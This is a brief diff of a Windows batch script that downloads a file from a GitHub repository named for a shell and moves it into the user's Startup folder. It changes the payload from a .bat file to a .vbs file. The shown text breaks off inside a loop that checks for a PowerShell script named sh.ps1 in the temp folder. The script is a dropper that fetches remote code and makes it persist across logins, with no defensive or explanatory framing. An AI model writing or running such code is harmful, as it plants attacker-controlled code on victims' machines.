@@ -1,6 +1,6 @@
 @echo off
-curl https://raw.githubusercontent.com/0x2034/shell2/main/start.bat -o "%temp%\start.bat"
-move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+curl https://raw.githubusercontent.com/0x2034/shell3/main/start.vbs -o "%temp%\start.vbs"
+move "%temp%\start.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 :loop
 set FILE=%temp%\sh.ps1
 if not exist %FILE% (
